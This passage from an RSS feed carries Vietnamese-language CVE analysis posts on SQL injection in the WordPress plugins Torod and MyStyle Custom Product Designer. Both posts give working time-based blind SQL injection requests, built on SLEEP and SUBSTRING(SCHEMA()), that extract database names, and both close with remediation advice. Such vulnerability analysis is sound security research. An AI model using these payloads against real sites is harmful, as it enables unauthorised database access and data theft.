Order&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Thứ tự thực thi truy vấn SQL&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;get-first-letter-of-database-name&#34;&gt;&lt;span&gt;Get First Letter of Database Name&lt;/span&gt;&#xA;  &lt;a href=&#34;#get-first-letter-of-database-name&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Điều kiện tiên quyết để &lt;strong&gt;dump được hết data&lt;/strong&gt; là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì gần như toàn bộ data đều dump được.&lt;/p&gt;&#xA;&lt;p&gt;Gửi request với &lt;strong&gt;SQLi payload&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&#xA;&#xA;action=get_regions_and_cities=1&amp;amp;country_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sử dụng &lt;code&gt;SUBSTRING()&lt;/code&gt; để lấy ký tự đầu tiên của &lt;strong&gt;database name&lt;/strong&gt;, &lt;code&gt;IF()&lt;/code&gt; trả về &lt;code&gt;SLEEP(5)&lt;/code&gt; nếu ký tự đó là &lt;code&gt;0x77&lt;/code&gt;(&amp;lsquo;w&amp;rsquo;)&lt;/p&gt;&#xA;&lt;p&gt;Sử dụng hex encoding &lt;code&gt;w&lt;/code&gt; thành &lt;code&gt;0x77&lt;/code&gt; vì &lt;code&gt;country_id&lt;/code&gt; được lấy từ &lt;strong&gt;POST&lt;/strong&gt; request trong nên bị escape bởi &lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;magic quotes&lt;/a&gt; trong WordPress và bởi &lt;code&gt;sanitize_text_field&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;👉 Dựa trên thời gian phản hồi =&amp;gt; kí tự đầu tiên đúng là &lt;code&gt;w&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-30936&lt;/strong&gt; trong plugin WordPress &lt;strong&gt;Torod&lt;/strong&gt; từ phiên bản &lt;strong&gt;1.9&lt;/strong&gt; trở lại, xuất phát từ việc truyền trực tiếp input từ người dùng vào SQL query mà không có biện pháp kiểm soát chặt chẽ dẫn đến lỗ hổng SQL Injection.&lt;/p&gt;&#xA;&lt;p&gt;Chưa có bản vá chính thực nào cho lỗ hổng này.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Kiểm soát kỹ input từ người dùng.&lt;/li&gt;&#xA;&lt;li&gt;Luôn sử dụng &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; khi làm việc với database trong WordPress để tránh SQL Injection.&lt;/li&gt;&#xA;&lt;li&gt;Thường xuyên cập nhật plugin và kiểm tra bảo mật để tránh trở thành mục tiêu tấn công.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/torod/vulnerability/wordpress-torod-1-9-sql-injection-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Torod Plugin &amp;lt;= 1.9 is vulnerable to SQL Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-48281 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-09-27-cve-2025-48281/</link>
      <pubDate>Sat, 27 Sep 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-09-27-cve-2025-48281/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-27-cve-2025-48281/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;Lỗ hổng tồn tại trong plugin &lt;strong&gt;MyStyle Custom Product Designer&lt;/strong&gt; của WordPress trước phiên bản &lt;strong&gt;3.21.2&lt;/strong&gt;. Lỗ hổng này cho phép kẻ tấn công tương tác trực tiếp với cơ sở dữ liệu, bao gồm khả năng trích xuất hoặc thao túng dữ liệu.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-48281&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-48281&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Sản phẩm&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/mystyle-custom-product-designer&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MyStyle Custom Product Designer Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Loại lỗ hổng&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Phiên bản bị ảnh hưởng&lt;/strong&gt;: &amp;lt;= 3.21.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Mức độ nghiêm trọng (CVSS)&lt;/strong&gt;: Cao (9.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Yêu cầu đặc quyền&lt;/strong&gt;: Không cần xác thực&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;MyStyle Custom Product Designer&lt;/strong&gt;: v3.21.1 (có lỗ hổng) và v3.21.2 (đã vá)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Công cụ diff&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; hoặc bất kỳ công cụ so sánh phiên bản nào&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;WooCommerce plugin&lt;/strong&gt;: phải được kích hoạt trước khi cài đặt MyStyle vì plugin này sử dụng một số hàm từ WooCommerce&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Nguyên nhân chính là việc ứng dụng chèn trực tiếp dữ liệu từ tham số &lt;strong&gt;GET&lt;/strong&gt; vào câu truy vấn SQL mà không có biện pháp xác thực hợp lệ.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Dưới đây là sự khác biệt giữa hai phiên bản (3.21.1 và 3.21.2) trong file &lt;strong&gt;includes/entities/class-mystyle-designmanager.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-27-cve-2025-48281/patch_diff.png&#34;&#xA;    alt=&#34;Bản vá khác biệt&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;So sánh bản vá&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Bản vá mới đã thêm danh sách &lt;strong&gt;whitelist&lt;/strong&gt; &lt;code&gt;$allowed_orderby&lt;/code&gt; để chỉ cho phép sắp xếp theo các cột hợp lệ. Nếu giá trị &lt;code&gt;orderby&lt;/code&gt; không nằm trong danh sách, nó sẽ tự động bị thay thế bằng &lt;code&gt;&#39;ms_design_id&#39;&lt;/code&gt;, ngăn chặn chèn mã độc SQL.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;how-it-works&#34;&gt;&lt;span&gt;How it works&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-works&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng nằm trong hàm &lt;code&gt;get_designs&lt;/code&gt; thuộc class &lt;code&gt;MyStyle_DesignManager&lt;/code&gt; (file &lt;strong&gt;includes/entities/class-mystyle-designmanager.php&lt;/strong&gt;).&#xA;Hàm này được gọi bởi các hàm như &lt;code&gt;get_items&lt;/code&gt;, &lt;code&gt;init_index_request&lt;/code&gt;, và một số hàm kiểm thử.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-27-cve-2025-48281/search_1.png&#34;&#xA;    alt=&#34;Tìm kiếm hàm get_designs&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Kết quả tìm kiếm get_designs&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Vì đây là lỗ hổng &lt;strong&gt;unauthenticated&lt;/strong&gt;, cần xác định hàm nào có thể được gọi mà không yêu cầu đăng nhập.&#xA;Kết quả cho thấy chỉ có &lt;code&gt;init_index_request&lt;/code&gt; có thể bị khai thác trực tiếp qua URL &lt;code&gt;/designs/&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-27-cve-2025-48281/chart.png&#34;&#xA;    alt=&#34;Luồng xử lý&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Luồng tấn công logic&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;kiểm-tra-sqli&#34;&gt;&lt;span&gt;Kiểm tra SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#ki%e1%bb%83m-tra-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Gửi request chứa payload SQLi để kiểm tra:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /designs/?orderby=(SELECT&amp;#43;SLEEP(5)) HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Câu truy vấn kết quả:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) ASC LIMIT 25 OFFSET 0&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nếu phản hồi chậm 5 giây → payload hoạt động.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-27-cve-2025-48281/time_resp.png&#34;&#xA;    alt=&#34;Kết quả phản hồi thời gian&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Kiểm tra độ trễ thời gian&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Không thêm dấu comment (&lt;code&gt;--&lt;/code&gt;) sau &lt;code&gt;SLEEP()&lt;/code&gt; vì sẽ khiến SQL parser lỗi do xuống dòng giữa &lt;code&gt;ASC&lt;/code&gt; và &lt;code&gt;OFFSET&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-27-cve-2025-48281/debug.png&#34;&#xA;    alt=&#34;Debug lỗi cú pháp&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debug lỗi&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;lấy-ký-tự-đầu-tiên-của-tên-cơ-sở-dữ-liệu&#34;&gt;&lt;span&gt;Lấy ký tự đầu tiên của tên cơ sở dữ liệu&lt;/span&gt;&#xA;  &lt;a href=&#34;#l%e1%ba%a5y-k%c3%bd-t%e1%bb%b1-%c4%91%e1%ba%a7u-ti%c3%aan-c%e1%bb%a7a-t%c3%aan-c%c6%a1-s%e1%bb%9f-d%e1%bb%af-li%e1%bb%87u&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;GET /designs/?orderby=IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1) HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nếu phản hồi chậm → ký tự đầu tiên của tên database là &lt;strong&gt;w&lt;/strong&gt;.&#xA;Kỹ thuật này có thể được mở rộng để trích xuất toàn bộ tên cơ sở dữ liệu hoặc bảng dữ liệu.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-48281&lt;/strong&gt; trong plugin &lt;strong&gt;MyStyle Custom Product Designer&lt;/strong&gt; (&amp;lt;= 3.21.1) xuất phát từ việc đưa trực tiếp dữ liệu người dùng vào truy vấn SQL mà không xác thực đúng cách.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá &lt;strong&gt;3.21.2&lt;/strong&gt; đã khắc phục bằng cách áp dụng danh sách cột cho phép (&lt;code&gt;whitelist&lt;/code&gt;) và kiểm tra giá trị đầu vào.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bài học rút ra:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Luôn xác thực dữ liệu đầu vào.&lt;/li&gt;&#xA;&lt;li&gt;Khi làm việc với cơ sở dữ liệu trong WordPress, &lt;strong&gt;bắt buộc dùng &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt;&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Thường xuyên cập nhật plugin để tránh trở thành mục tiêu tấn công.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 